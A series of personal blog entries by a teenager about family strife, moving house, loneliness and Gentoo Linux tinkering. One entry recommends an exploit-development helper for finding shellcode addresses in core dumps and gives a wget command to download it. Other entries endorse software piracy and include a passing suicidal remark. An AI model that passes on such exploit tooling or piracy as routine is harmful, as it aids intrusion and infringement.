      Today i woke up at about 1-2 PM but not fully. Mom comes in while im sleeping and wakes me up telling me that my tutors going to come. That was a bit of a surprise because i havent seen him in like 2-3 days. I was dead tired in my bed, opened my eyes a little and told her that i couldnt get up. I was just way too tired. She said that she had to call him. So i told her where my wallet was which had his number, and she did. Then i fell back asleep. I awoke at about 6 pm then. Got on IRC. Started chillin' and thats all really i did for a few hours.  I was hungry. Really hungry. There really isnt any food at all in the house. Everytime my mom goes shopping, she supposedly spends $100-200 on groceries. I dont see on what. She buys nothing at all that i like. Since my brothers diabetic, she buys tons of sugar-free crap. Im getting extremely sick of all this. I am underweight according to a BMI calculator AND my scale, yet no one gives a flying fuck. Its pathetic how i live... I hate my life sometimes. I will never say that i hate myself. Cept for my nose...  After awhile of talking on IRC and stuff, hanging out on the gentoo box as usual updating things, i decided to just fool around and look for food. Nothing really in the house. So my mom orders italian food. So i had that for a dinner. Thats basically the only meal of the day that i get something to eat. Dinner. My mother does not cook at all, and my father is considered dead to anyone in the house. Hes a peice of shit.  My mom was also talking about how we're gonna be moving in a week. Thats very surprising. A week. Considering that my birthday is IN a week. 7 days till i turn 17 on the 7th month of the year. Lucky 7's.  Ive been very angry lately. My health is shit. I have nothing. No friends really that can come see me. But who knows, thats probably gonna change after the move, cause we're going back to our old area. I really do not want to. I like it here even though its hard to even go anywhere. But when i do get the chance, i go for it.  My rooms extremely messy. I just started not giving a crap. Who cares.. My lifes just another crap hole. I find my freedom online. Its kinda hard though. Right when i get online then finish about 17 hours later, i realize that i didnt really do anything progressive at all. What exactly do i do? I sit here, look at some sites, sit on IRC and various other random things... Today was just very long and annoying though.  I was noticing that i had no clue how to check on packages on the Gentoo box that needed to be upgraded. I asked my friend uptime on IRC to ask one of his friends, and it was a simple thing which i ALMOST kinda knew as what to do. It was a simple line, so i did it. I noticed that there were a bundle of packages that needed to be upgraded, including the kernel, xfree and glibc. Not knowing that xfree and glibc would take that long, i went along with the upgrade. It took literally 5 hours for all 17 packages to finally upgrade. I dont even know if it was worth doing. After the final merge, the emerge tool told me that i had about 290 old /etc/ files. I checked with etc-update and noticed that most of the things that needed to be updated were all the new files that came from the xfree upgrade. I just left them, it was very odd. I never came across something like that. There were also some minor alterations in the newer /etc/ files...  At the moment im extremely delerious. I really dont see myself at the moment as being able to fully comprehend the things im thinking. Its very strange. But this is what happens when your in delerium. Im starting to just see things. Not something crazy like youd see out of mirage. But just... stuff like specks. And spots. For all i know it should be shadows, and for all i know it could be mosquitoes. Somehow mosquitoes get in the house.  A few times, giant mosquotes would come in. Now, my idea of giant is about 4-5 inches long. Well their legs that is. Also when your in my position of delerium from sleep deprivation, you start to feel very dirty and sick. Like you have 10,000 spiders crawling all over. You start feeling all the nicks and nacks of things on ur body that u dont normally notice a feel to. You start feeling your hair folicles touching your head tickling you. You start feeling the hairs on your neck and back rub against your skin. You start to feel the material on ur shirt start tickling on you. Your hands itch. Everythings sick and disgusting. Your mind gets warped. You start hearing weird noises and start realizing things as if you got released into an omnipotent status. Freaky.  Right now its about 5:25 AM. My teachers gonna come today, i better sleep soon because i dont wanna miss another day of tutoring. I would sleep, but im just a bit paranoid with all the shadows and things im seeing. I really do not wanna sleep while having one of those big mosquitoes in my room. I gotta set my alarm...

      Ive been sitting home as usual. For some reason ive been going out lesser and lesser. THe only reason this is happening is, 1) i have no where to go, 2) i have no way of going anywhere, 3) i have no one to go with. Dont i have such an awsome life. I dunno i do kinda feel lucky in a way. Im lucky with some skill and talents :P i do deserve some bragging rights.  I also finally got to talk to Chris after like a week of him not being on. Apparently something happened that i really dont wanna talk about. Either way, i dont even know much of what happened. No details.   Anyway, i was thinking of things to do on my birthday. Im not sure what exactly i want to do. My mom has this plan set to go to Atlantic City. Of course thats her first choice since thats the only place she'll go to as a vacation... This woman has no sense of adventure at all. I really do not want to go to Atlantic City but she also said that Dave Chappelle is preforming live there. That i really wouldnt wanna miss, but i kinda will miss it. Theres nothing to do in Atlantic City. All there is are hotels, casinos, slums, a board walk and a mall. And lets not forget the ever popular Pier.  Ive also been doing some reading and such. Not totally normal books except this one that i got from a candy store when my mom was playing her Lotto. I looked onto the book rack and noticed this book called "In This Skin". The synopsis looked intriguing so i bought it.  The books that i mentioned -- not regular books -- were some technical ones. I download, i never buy. Information should be free, therefore i pirate. Anyway, i downloaded some more ebooks like i always do. I have about 300 MB of books including "Hacking: The Art of Exploitation", "Expert C Programming" (recommended by a friend from Team Teso), "UNIX Network Programming" (both volumes by W. Richard Stevens), and various others. The most recent that i downloaded was "GCC The Complete Reference". Basically an ebook with EVERYTHING on GNU GCC which is the C compiler on UNIX platforms if you dont know. And i only got it because it was curiosity that struck me on various flags and types of makes in Makefile's when you compile certain software and i wanted to know which each meant. The ebook didnt give me really that information, ill have to check with another. It did however give me some other information such as certin inserts and things like:        #include                int main() {       printf("the time is %s\n",__TIME__);       }  Might sound a little lame to people, but i had no idea that there was a __TIME__. Theres many others such as __DATE__, and __BASE_NAME__, and some others. These are not to be confused with __ASM__. It also had some other things... it gave some thorough defintions of pre-processor functions like defines and pragma, etc. It was interesting even though i already knew, but its always good to review and remind.  I always love reading guides, tutorials and books. Information is great. The more you read, the more you learn. The more you learn, the more you understand. And the more you understand, the more you live. Thats like a personal 3 sentence motto i go by. It really should apply to everyone. Basically it does.  Im idling on IRC now as usual. Everyone thats not on the western hemisphere is awake. Euro and Aussies are out on IRC now. No disrespect to them, i do have friends outside of the US. Im just bored. Its like 5:40 AM. Sleeping schedule is once again screwed. Its kinda hard to fix. Usually it doesnt happen when i go out, because when i go out i do stuff, and when i do stuff i get tired. So when i get home, i fall asleep at the right times. When youre home all day long, you dont really get tired, your just lazy. Laziness doesnt make many people tired unless your giant and just ate. But anyway, you have to do stuff to get tired. Its hard. Sometimes though when im in this situation i try to stay up as much as i can, then fall asleep at the right time to get a fresh start. That gets very challenging. When you stay up way too long like that i start to get nauseated. Then after the nausea i feel extremely dirty and shitty like i havent taken a shower in years, then you start to feel delerious and paranoid. Its nuts. Thats what happens during sleep deprivation. But you know, thats what caffeine is for. But i have no caffeine except soda, and thats not strong enough.   I really really realllllllly need to get a credit card of my own so i can order stuff. Especially ThinkGeek stuff. *cough* caffeine gum *cough*.  This also reminds me. I was thinking of building a comp. I never really built a comp before, but you know me, theres books to teach you that. So i downloaded "Upgrading and Reparing PC's" and some A+ certification book. I learned a deal of things from them along with the help of a few friends who took A+ and some who build comps for a living. That Upgrading and Reparing ebook is literally 1600 pages long. Its crazy, but who wants to buy it for $60 when u can download it =)...  Anyway, i go to the site that i know is the BEST for hardware, yes you guessed it, NewEgg.com. Most popular, cheapest, etc. I find it totally better than TigerDirect. But there is also ebay, but i dont have an ebay account and i wouldnt really trust it too much. Anyway, i was making an attempt to pick out items that would create a stable enough computer that i can use as a Gentoo workstation at a cheap cost. So i didled around, picked out some parts, layed out the prices and the URL's to them, and then totalled it up to under $500. Im hoping that everything will work with everything. Im like 60% sure it will. Ill have to show my friend after, i havent yet. The things i picked out were at like a minimal level. I have a friends box that i secure at the moment thats a PIII with a Coppermine core and its got only 600 or something megahurtz of ram and it runs totally smooth and nice. So heres the urls to all of them if anyone wants to comment on it, this is also finalizing this post:  case - $019.95 - http://newegg.com/app/ViewProductDesc.asp?description=11-126-133&depa=1  motherboard - $045.00 - http://newegg.com/app/ViewProductDesc.asp?description=13-128-234&depa=0   ram - $084.00 - http://newegg.com/app/ViewProductDesc.asp?description=20-145-006&depa=1   graphics - $053.00 - http://newegg.com/app/ViewProductDesc.asp?description=14-131-228&depa=1   sound - $000.00 - sound is integrated within motherboard.  processor - $070.00 - http://newegg.com/app/ViewProductDesc.asp?description=19-112-176&depa=1   cd - $021.00 - http://newegg.com/app/ViewProductDesc.asp?description=27-134-007&depa=1   harddisk - $058.00 - http://newegg.com/app/ViewProductDesc.asp?description=27-134-007&depa=1  pwer supply - $042.00 - http://newegg.com/app/ViewProductDesc.asp?description=17-154-010&depa=1  keyboard - $023.00 - http://newegg.com/app/ViewProductDesc.asp?description=23-109-125&depa=0  mouse - $019.00 - http://newegg.com/app/viewProductDesc.asp?description=26-105-148&depa=0  TOTAL COST: $434.95

      Turely is a hard knock life. Its been very boring lately. A lot of anguish and disgust. But im tired of being all depressed. Lets think of some good things. Lately ive been pondering and things about random junk. Ive been getting through new versions of my bash script NixFo which is available @ http://atomix.wtf.la. Its in a large stage at the moment. Currently theres over 900 lines of code and counting. Ive been working on version 9.0 which will be released shortly. Its nothing too public. Only people who wanna get it that idle with me on irc are the ones who get it, otherwise anyone can just visit atomix.wtf.la and download it.  My main site has been down for almost a week due to the server rental's servers moved to a new location. Or in the process of moving rather. I dont mind though. Usually i go crazy over things like that. Just as long as i have a site. This is why i have at least 2 or 3. So i have the atomix.wtf.la page and this blog which is merely a personal object. A private object as well. If your reading this, and you know me, then consider yourself lucky. If your someone who knows me, dislikes me, and somehow stumbled here, then screw you.  Currently its about 6 am. I should be sleeping. I havent seen my tutor in 2 days which is extremely odd. I hope something didnt happen. I have this very very weird feeling in the back of my head that he called the cell phone, my dad answered, and said shit. I just have a strong feeling of that. Otherwise for all i know, something came up for him. Possibly he went on vacation, or possibly hes moving, or even possibly he wants to do something on his own time for the summer. I dunno, he would of called. Surely he would of. Makes me worry.  On IRC its been fine. Idling and chatting in the same chans. Apparently #blackhats has gone public and a lot of people have been joining. A lot of people that ive seen before but never got acquainted. The kinda people you wish you were friends with. I made peace with one or two. Theyre cool guys. Also #nixsec went public. The channel doesnt have a chan key anymore. A bundle of people came there too. Its all good. Just as long as no one fucks with anyone :).  My good friend will aka illwill from illmob.org setup a nice gentoo 1.4 box. Its nice for what it is. I used my NixFo tool and noticed that its an old box. Its statistics are worse than the one im currently on. It makes me think that i shouldnt take this one for granted, but it also makes me think i should buy some old computers like his 598 MHz PIII Coppermine and turn them into nice gentoo boxes. From the shell, these p3's on a cable is fucking slammin'. The only time i see a lag is like rarely. Everything is smooth, no keystroke lags, and everythings all good. Fast connection and its a smooth ride. Just as good as having the latest. The only difference is the hardware aspects. Less of a better video card, and sound card. But that means shit to me. I do everything by command line. I need no GUI =).  Gentoo by far is my favorite. The one thing that is great about it is its portability. Yes, there IS apt-get in debian, rpm in redhat and swaret in slackware. But the thing about Gentoo's portability is that it allows you to search the latest packages, upgrade em (which almost all do), but also receive the patches and its dependencies. If i didnt have that, id have to search 3000 miles over the net. But it all depends on what your attempting to install. Most of the time i know what to install, but when it comes to something i dont, Gentoo saves me the time.  I secured his box totally. Well, Gentoo kinda is already secure if you think about it. Its kernel has patches, and its a rarity for you to see a Gentoo advisory. If you look at secunia.com, you'll notice how Gentoo has only had about under 200 -- as i recall by memory -- advisories throughout the entire time secunia.com has been in existence -- which is awhile -- therefore you know its something worth having. And of course theres gonna be badmouthers saying its crappy. But its what you love. If you like an OS, then go for it. If you like a distro, then go for it. The only thing you need to worry about is your skill level within it. If you use windows, and someone says you suck for using windows and your a master at it, then thats something to be proud of for yourself. There is also the factor of your image, but if its what you like, then stick with it.  I myself love linux. I love windows too. Its kinda hard to not love windows when you think about it. Its just very easy to use. The thing that many people hate about it, is the fact that you cannot customize anything at all except visual settings and program configuration. Thats all you are allowed to do. It also has no development tools except third-party ones that you have to download and install. Its all a pain. Windows is more of a homey family kinda thingy or a kind of look at pictures, surf the web, talk to friends type of thing. Linux can be that and more. It lets you customize and it lets you do just about everything else. Basically its like having a Backbone PC. It comes with its defaults, and then you upgrade it. Windows is like buying a PC from a store. You cant customize it, its just there. And that is why i prefer Linux over Windows. Some people should think about that. Im no one to rant, im myself.  Oh look, my cute dog walked up to me and wants to sit on my lap. Im just gonna stay on for a little longer.

      Today was just very boring. Nothing at all happened... I was planning on going out but of course my mother takes hours to take a shower and get dressed then leave the house. Takes about 3 hours before we go outside from the time she says "lets go out". But anyway, i didnt go with them cause i was arguing with her. Shes crazy. She really needs to see a psychiatrist.  Anyway, they came back when they were supposed to go food shopping and they didnt. She walks in with a Steve Madden bag... Now why is that not surprising. She comes up to me and im arguing with her and shit, she tells me to stop and then gets all aggravated like and putting me down by saying im a sicko and a lunatic. After that she tells me she got me a phone. Of course that was a lie. She got herself a phone and gave me her old one.  Then after another 30 minutes, she tells me we need to go get food and stuff. We leave the house, she wanted to go to a restaurant to eat but i told her that im not, because theres no way in hell that im going into a high class restaurant with my mother and brother. They will start a scene, and i cannot handle that embarassment. Thats the last thing i want. So she takes us to the supermarket. I stay in the car because shes just so fucking embarassing. She supposedly is a little hard of hearing and constantly yells saying "What?" like extremely loud and she did it 3 times in the parking lot, and i cant walk while shes starting that shit. So i stood in the car... And thats all.

      Yesterday was fun as hell. BBQ was great =P... It all started at like 5 in the morning when i woke up because i was all anxious. I waited until about 10 am and belle was online, we were talking and stuff. Then about 11 she left her house with eva and yuri. And then they told me on the phone when they were all on the bus and stuff, i waited until they called me to tell me that they were ready to get picked up, cause me and my mom had to pick them up at the corner of middle neck and northern. So when they called from there, they told us where they were and me and my mom and my brother went and picked them up. It was funny cause they all looked older lol... I only knew belle and eva from junior high from years ago. Belle looked the same but very much thinner and yuri got really older looking and thinner as well. I had never met eva before, she was with her brother also.  After we picked them up, we drove a bit and stopped at the deli to get some drinks. I was really nervous cause i havent seen them in a long time and stuff. So then we hop back into the car and go over to my house. My mom dropped us off cause she had to go food shopping. While she was out, we were sitting around talking and watching tv and just playing around and stuff. The only thing that sucked at this little gettogether was that a couple people didnt come. Boris couldnt come for some personal reasons i wont discuss, and for some reason my friend Chris didnt come, i dont know why. I havent seen chris online since yesterday morning...  So we were playing around and joking. We played that game "shocking roulette" where u stick ur finger in, press start and it goes around in circles till it lands on a random person and gives them an electrical shock. Eva seemed to enjoy it..lol.  We then had the BBQ after my mom came home with the food and stuff. We went out side and i put in the charcoal and lit it. Waited till it got all white and then started cooking some hotdogs and shishkabob. And then out of no where, it starts to rain and i had to bring the grill to the porch which sucked. I had to cook it all in a tiny space with all of them sitting lol. No table either so it was even harder bending down near a hot flame. I think thats what gave me the big headache, inhaling all that smoke.  We played around a lot as well. We for some reason played truth or dare lol... And got all funny and sexual. It was hilarious. I had a real blast. We went upstairs to my room after eva's brother left cause he had to go to his prom and that was funny up there too. Eva put on some music and her and yuri were reggae dancing lol..  It was a fun party. It made me tired as hell but i still enjoyed it.

      Today was really fubared. Just... ugh. Well i was out with my mom and my brother because i had to get a damn grill and shit for the barbeque tomorrow. She first had to go to the bank, then her perscription and they finally finished all their crap at about 5 pm. Then we're looking around for a grill. I wanted to go to sears because they have tons of grills. She kept complaining that we dont need an expensive one for over $60 because its only gonna be one barbeque. And i kept yelling at her that i dont want some cheap ass grill. And im gonna have like 7-8 people over the the shit.  So anyway we get a cheap ass grill that cost like $13... Very lame. Its retarded. Anyway also i bought 3 hawaiian bamboo torches which ive always wanted. So ill be putting those in the back tomorrow.  Anyway the barbeques hopefully gonna be great. Im hoping it doesnt rain like it did today and i gotta spray outside for the stupid mosquitoes...

      Today was just very annoying. Last night i had to sleep in the living room because my air conditioner was being a dick. Also there was this giant mosquito in my room last night that looks like a flying spider. I had to get my mom to kill it because it was hard to find and i was tired. It just just really big. After she killed it, i was just disgusted cause it had long legs and a long snout for sucking blood.  Anyway. Today was just hectic. My mother was annoying because her phones got disconnected and just always getting annoyed. She asked me to ask some friends to call my dads cell phone to tell him to get here and shes yelling at me because i didnt wanna ask twice and calling me an animal. I cant stand how she takes out everything on me.  Also i have a BBQ on friday that im hosting at the house and i still havent gotten a grill or the meat. Currently my moms paying that phone bill and the thing is in a day and a half. Tomorrow i have my tutoring but i was hoping to get the grill today so tomorrow i could get the meat after tutoring. Hopefully this all works out... If it doesnt, then its just going to be one of the many other hopes that ive had that were ruined.  Last but not least im a little angry because my site is still down. The hosting place still hasnt done anything to restore it. I accidently did something wrong attempting to make the loopback and eth0's non-promisc with ifconfig. I fucked up and the box totally crashed and there wasnt really anything i could do remotely. I really shouldnt of done that lol... I hate redhat anyway. Dumb distro. Gentoo and Debian are so much better.

      Looks like ive switched blogs again. Ive went through so many. But by far, this one seems the best. It lets you search for free, and its got many members and a lot of things i suppose. I like the profile layout so much better than the others, sucks it doesnt put ALL the interests =\... And also sucks that it doesnt let you add your playlist like on Mod Blog. Oh well. Ill live. Ill post later, its very hot right now even with my air conditioner on.

      Haven't posted in like 6 days. Ive just been a bit busy lately i suppose. I dont have much of a busy life, but ive been seeing my friends often, and ive been doing a bit of coding lately. During the past 6 days, a few things have happened. Nothing special, just going out. Yesterday my friends came over for awhile. Me and Belle had gone to Austin Street just to browse around, but decided to go to Barnes and Noble. We were there for at least an hour and a half looking around. Finally we go on the line, she bought a book and i bought scrabble, because the book(s)  i wanted were $14.00 each, and i only brought $29 with me.    Today i was supposed to get tutored but my mother is being a cheap asshole and apparently my education isnt worth anything at all. Great mother.    Yesterday i got a really cool electric trimmer, its from BrAun, it was only $16.99 + tax. I like it a lot. At first, i thought it was just a trimmer rather than just a shaver and i ended up shaving off my beard, it looked horrible so i just shaved it all off including the stash.

      Finally got a chance to move the rest of my shit to the new place. This includes my computers. I feel a bit more secure now. I cant imagine myself being deprived of a computer for more than a week or two. Anyway, the modem isnt like as fast as the Opt Online, but i dunno, maybe im just not 'feeling' it. Im gonna try out a bandwidth test right now...    1.6 megabits per second. Whoa... ew... Slow as crap. I figured it would be that low :(... I had a maximum of 10.0 MBit on Opt. Online using a Cat5 ;\... Blah oh well..    Right now ive been going through some hardships. My attitude is growing more and more against my mother because shes a weirdo and i dont like her a lot. I feel as if she really does not even care that she has another child, aka me. Im just gonna idle on IRC and talk to some friends and visit some sec sites for updates...

      Finally we moved in. The good thing is that im away from my father. Happy about that. But i was hoping that everything would be just a little different. And when i say that, im saying as in my mothers attitude changing. Apparently it hasnt. The only thing that has changed is that theres no more screaming and verbal abuse anymore. Cept for some of the verbal abuse towards me. I think she needs a therapist badly, but apparently everyone believes that IM the one that needs the therapy. That just goes to show that im the only normal one besides one of my aunts in which has the same exact perspectives as me. I think that got brought down a generation. My aunt Susan is basically an older and female version of me with a slightly bit of... how should i put this... Orthodox meets Un-Orthodox? Like shes normal but she can get weird like for example... We go to the store and stuff, and she thought that this cereal was 2 for $3. Apparently after paying and walking out, she takes notice to the reciept and glances at the price of the cereal noticing that it was charged $3 each rather than 2 for $3. She then started getting agitated saying that it was 2 for $3 and that she was going to go back and stuff to fix this... All this commotion for 3 lousy dollars...?    The new apartment is great. Its spacious. White marble floors as i took a notice towards. Tons of closet space. My room is slightly smaller than my other room in great neck, but now with 2 closets. Its fine for me...    Ive been going through hell lately though. Thinking and hoping that my mother would change, its just the same her all over again. Her uselessness, her mental agony and pallid seriousness. Its really sickens me how she doesnt listen. I feel very ignored and in a loner sense of view.    Im also extremely angry. At the time of the move from Great Neck to Forest Hills, the movers had finally arrived. All morning my father was drunk and high and causing serious trouble. I was so excited to leave that i almost teared. I was that happy. After finally almost packing the entire truck with all the furniture, my dad takes off with the car. My mother thought he would come back due to the fact that my brother is mentally retarded and has diabetes, he'd come back. Apparently her judgement was way off. He never came back. We had to get the movers to drive to the new place. My mother had called my sister to open the door for them during the move while we thought of a way to get there. My mom then came to the conclusion that we should just take a cab since he wasnt coming. She did a smart thing i suppose, especially since when the cab came, it was luckily a gigantic van. Kinda like the one where it has 16 seats for Airport transport.    We couldnt take everything. I had to leave my desk there because it wasnt able to fit through the door. What could i do, the shit was built in my room. And i also did an extremely stupid thing. My clean laundary was left in the dryer. And on top of that, the worst fear i could ever encounter, my computer was left there.    It was very terrifying though, but i knew that we would go back eventually and get it. Apparently we didnt. I was supposedly to go today with a friend to get it. Apparently he never showed up. The landlord of the house had threatened to evict my mom sending a letter of eviction and a date in which we had to move out everything, otherwise lead to legal actions. Also apparently my father had called my mother claiming that the landlord "Sylvia", had disposed of all of our things to the street corner. Either my dad was high and fucking with my mother, or the bitch really did. If she did, shes getting her skull cracked and her ass in court.    Currently its 12:41 AM and im waiting for my sister and cousin to come back from a bar that they go to every Thursday, Friday and Saturday. A weekly pre-weekend to weekend ritual for them. When they get back, ill most likely go to bed since im tired.    Tomorrow im HOPING i can go get my computer. Thats all i really care about. My computers, my monitor and my floppy disk containing all my important fed-free information in which if i lost would result in total depression and disaster. Its irreplacable and im hoping i packed it.    Ill finalize this post by stating that im on my aunts computer and that tomorrow my friend will be coming. Looking foward to that. Also on Friday which is actually today -- it being 12:43 AM -- i will be babysitting my cousins daughter between 11 PM to 3 AM. Thats hours after my friend will be here and gone. Then on saturday im going out with my cousin and sister and possibly another good friend of mine -- Belle -- to a restaurant or something. Cant wait for that =). Ta ta.

      Today we went over to queens to check out the apartment. It was pretty cool visiting the building after all these years. The new lobby is nice. They even installed a new elevator. We stepped in and stopped at the 6th floor of The John Adams. We arrived first at Jill my coustins apartment in which she shes with one of my aunts, and my sister. It was really crazy when we walked in, noticing that the entire apartment was totally overcrowded with things. It made me ponder on where my sister slept. Considering Jill has a young one, i dont blame the apartment for being such a wreck.  After stopping by at Jills for the slight moment, we went 3 paces across to our apartment. Once i stepped in, i was apalled actually. The floors were white marble and beautiful. When you walk in, it had a very modern techy look. Everything white. The ceiling fan in the dining area was metallic and controlled by an electronic panel on the wall. The kitchen was very very small but it doesnt matter. Once going in and looking about, i noticed that once you go towards the part where the rooms are, the niceness fades. Everything else was basically un-new. There were however the 7 closets. I first stepped into the room which had the terrace. It was not as i thought. The room is probably the size of the one i currently have. Its got its own bathroom and the room has hard wood flooring. The bathroom was a horror actually. But there IS a super, therefore things like this can get easily fixed at any time.  I then stepped into the room that i was going to take. I was as well apalled at this in a bad way. The carpet was utterly disgusting in a burgundy red color. The walls were white with various stains and marks. The ceiling was unevenly layered along with glow-in-the-dark bevelled stickers in the shapes of various sized stars. I have two closets and one of them has a mirror on it which i love. But the only problem with the closets were that the insides were old, and the outsides have horrible paint jobs with dried paint on the mirror.  At the moment its 4:42 AM and i need to go sleep. The allergy syrup is starting to kick in, and we still have to clean up and move the rest of the shit in the morning. The movers will be coming on Wednesday. The cable will not be here for about a week or less and im hoping less. I will possibly be modemless.... So i really need a cell phone badly at the moment.  Im going to go sleep now. Hope everything goes well. I dont care, it most likely will. Basically i have Heather and Jill to take me out anytime i want =)=).

      Coolio tool of the month.... its called segment. pretty old but i just found it on packetstorm after some digging. Its useful because who the fuck wants to search GDB for the memory location of your eggshell... so this tool basically finds it for u in a coredump. this is 'not bad' the only downside is that it gets the memory location from a coredump and sometimes you mite not just be doing it FROM a coredump. you can just do getenv() no biggie. dont forget to load the eggshell BEFORE segfault or else the environment data including your eggshell variable obviously wont get written to the dump... to download wget http://atomix.0catch.com/segment. below is how it worked for me... w00t.

      Of course i had a bad 4th of July... Nothing at all good happened. It was just very weird i guess. It wasnt like totally bad it was just extremely boring cause we didnt even get a chance to do anything till maybe later in the night, but that turned out to suck as well.  Started in the late afternoon at about 4 PM when we finally left the house. It was hard to not get angry, but i only thought about myself, not realizing that in about a day or two, that we have to move everything. But still, it did tick me off.  We finally left, did basically nothing. Started heading out of Long Island because my mother wanted to see the aparment that we plan on moving into. Supposedly it has the following features which are listed below in no specific order. These are only details that I myself have heard so far...  - 7 closets - 2-3 bedrooms - walk-up dining room - white marble floors  And thats basically all i heard. The only detail that caught my eyes were the white marble floors. In the house here, the floors suck. Its not anything like old floors or something like that, but its granite. Basically granite floors are cheap flooring that looks good. Plus granite stains very easily, so if u spilt soda or something and it sat there for say 5 minutes accidently, you get a nice big stain. It tends to go away if you wash it constantly, but its a bit weird how it stains. The stain seems as if its totally INSIDE the granite, you cant even feel the stain or anything, yet if you scrub it, it gets removed. I dont know the particular science within them. Another reason to disrespect what Earth Science class lacks in grade school.  Anyway, on the way there, we had to stop at Wendy's cause since my brother David is diabetic, he had to get certain amounts of foods per day, so we went to get food. Of course me and my mother were arguing because i still havent forgotten how much of a liar she is, and how no one got me anything for my birthday.  So before we got a chance to actually leave the border of Long Island, my mother calls my Aunt (who lives in the same building... along with my cousin... and my sister... and my other aunt... and my grandpa and where my grandma USED to live before she died r.i.p...), to ask her if the people who used to live in the aparment (the previous Super, in whcih you know the apartments going to be nice since hes the super), whether or not that theyre there so we can see the apartment. Apparently they werent, so we didnt end up going there. My mom kept on driving towards there though since its near Austin St. which is basically the shopping Mecca of Forest Hills. I used to live there, only some things changed. About 15 new stores since i last went there. There really isnt any shopping that intertests me at all... except for the giant Barnes and Nobles. Thats about it. Actually theres a Staples too, so two stores that strike my fancy.  So anyway, we're driving down that way, we recently have driven over there just to see how the neighborhood turned out since way back when. Apparently the same kinda people, but a short bombardment of other people (ethnic wise). No im not racist, its just an observation. But towards the other side of the town, like the eastern part of town where the rest of the places were, are very odd and weird people. Luckily we're near the shopping. I just really cannot stand to be in an apartment or that area. Its not like its a bad area, but im used to living in areas where the houses are big and spacious and everything is secluded and suburban like. Over there its very urban-suburbish, in a way. Its not my kinda thing, but i have no other choice.  Supposedly when im there, my sister and cousin will be taking me out a lot. SUPPOSEDLY. Yea sure if my mom pays them enough. I dont like disrespecting my sister, but the girls 24 and she works at Keyfood and asks my mother for money constantly. My cousin who is only 2 years older than her has a child, supports her, and has a job. It boggles my mind. Heather (my sister) is not stupid at all, shes just lazy.  I havent seen my tutor in awhile either. Im sure when we move, he'll start coming. Cant wait for that. I feel so lonely with no friends at all or anyone to talk to. Hes so much better than getting a therapist if i do say so myself. I dont need any therapist or psychologist up my ass, even though i do find the profession quite intriguing. Ive thought about that as a profession (a secondary one). I really would like to minor in psych.  So anyway, as we're passing through Austin street, my mom was fancying all the new stores... and of course her being a woman, admiring all the girlish stores such as the new opened Sephora. I really cannot stand it when im wither her and she wants to go to a womanly store. Im sensitive, but not that sensitive when im '''WITH MY MOTHER'''....  I usually sit in the car when im out. I only go with them so i can get out of the house and get some air. I love sitting home on the computer, and this is why i prefer getting a laptop. I get some nice air. I do open the window, but never during the summer due to the high traffic of bugs, so its a bit secluded. Its nice though sometimes, i can still open the shades...  So while we're passing through Austin street, we decide to just go back towards Long Island. It had been about an hour or two from there cause we were just strolling around parts of town.  We get towards Long Island and my mom wants to go to the supermarket in Little Neck. So she heads in. I sat in the car because i did not want to go in. So she goes in with David and i relax in the car with my dog. I was sitting and reading my book.  The book im reading is extremely enjoyable. Its a great book compared to some others that i have read. Its called "In This Skin" and its by Simon Clark. On the cover, a comment by someone had said that Simon Clark has what it takes to become the next Stephen King. Simon Clark has also won 2 British Fantasy Awards. Im not sure what they are, but an award is an award. Its good. It started out extremely boring, but as you get in at about page 50 or so as an estimate, it gets to the part where it discusses the villian of the book which ill only describe as not human and freaky. Im at about page 125 of the book and its gotten good. There has only been about 2 parts so far that have really gotten me to show some live emotions when reading. Usually that does not happen to me unless im reading some paper on line about programming or security in which i show emotion like "Ohhh now i see", or "Ahh... yea", or even "Well yea obviously...". Emotions in that manner.  They finally come out, stuff their groceries into the car. By then i think it was about 7 :30 after stopping at a candy store since my mother had to get cigarettes for my father and me stopping to get some Ice cream from this place which took about 20 minutes just for fucking 3 pints of ice cream. So we get there, we're relaxed and then all of a sudden the girls come (Heather, Jill (my cousin) and Jill's daughter). I didnt really have any emotion at all in my face because i was a bit ticked off when i saw them because i of course knew that the only reason they came was because Heather wanted money. My mother supposedly gave her only $20. Usually my mother gives her about $60-100 for the week. The most my mother ever gave me when i was under 13 was $20, so that must of been just pocket change in her eyes. Im 17 now, and i dont at all ask for money. I have no where to go to spend the money. I have no one to go WITH to spend the money. Therefore, i do not need money. Lucky for my mother i have nothing to do with my life at the moment until im in College which im hoping occours otherwise i will disown her for life and kill myself.  At the moment its about 2:49 AM making it tomorrow, which is July 5th. I cant believe that 2 days ago i turned 17. It passed by so fast. That reminds me a part of the entry that i didnt mention. While we were out getting ice cream, we were searching for fireworks. We couldnt find any. We were following the sound of bundles of them, and my mother was driving through Kings Point which in reality is 5 paces away from our block since we're right on the border, and we go allllllll the way up to where we heard them, and apparently it was way up to where the Kings Point Merchant Marine Academy was. We noticed all these people walking down the street like a miniature parade of people going home. We then came to the conclusion that it was just a celebration of some sort at the Academy. My mother made a U-Turn and asked a man politely from the window whether or not there were fireworks. The man responded in a strong accent that it was finished. That gave us the signal to sigh and go home.   So anyway, im here now. Its 2:51 AM and im a little bit on the drowsy side. Usually id be extremely energetic and active since im not much of a sleeper and partial an insomniac by self diagnosis. My mother gave me some Bennedryl. That will surely knock me out. Its for allergies apparently. I myself am a sufferer of allergies so it does me double the relief.  We really need to hurry with the packing. The movers come on Tuesday and considering that its almost 3 in the morning, and technically Monday, the movers will be coming tomorrow. My mother has to quickly hire a lady to clean whats left of the house. Not everything is even packed. I still have the computer on my desk. Most of my things are packed though. I do not even have much anymore. We've moved so many times that half my room is missing. So therefore i only need about 3-4 boxes to completely clean out my room. One of them being my clothing. I dont have much clothing anymore either. My style dramatically changed anyhow, so i buy new things ;).  In the morning, we're surely going to pack everything quickly. Im sure we're not going to go out or anything since theres so much work to do. I will definetly not unplug all the computer parts until the movers arrive so i can tell my friends that i wont be on for a bit. Im HOPING that the fucking cable modem comes quickly. Im really not entirely sure whether or not she made the order for that. Plus its going to be Roadrunner, its not even as fast as Optimum Online. Plus, my main computer still suffers from network failure and my damn Windows XP CD will not accept the key. Its a great Cd actually. My friend let me download it from him. Its an 8 in 1 windows CD. I despise windows, but its still a convienence (PROGRAM WISE ONLY, bastards cant make everything linux compat.).  I did however happen to download the Gentoo 2004.1 LiveCD. So even though my Windows main has network failure, that will not at all affect Gentoo since it has its own drivers and file system. Its still going to be a wonder how i plan on getting the modem to work with it. But it then comes to my attention that i can download VMWare on the Win98 box, burn that to a cd, transfer to the main WinXP box, and then do it through there and actually save the shit, rather than a LiveCD where the data will become nothing more than zero's in /dev/null. Ill possibly do that -=).

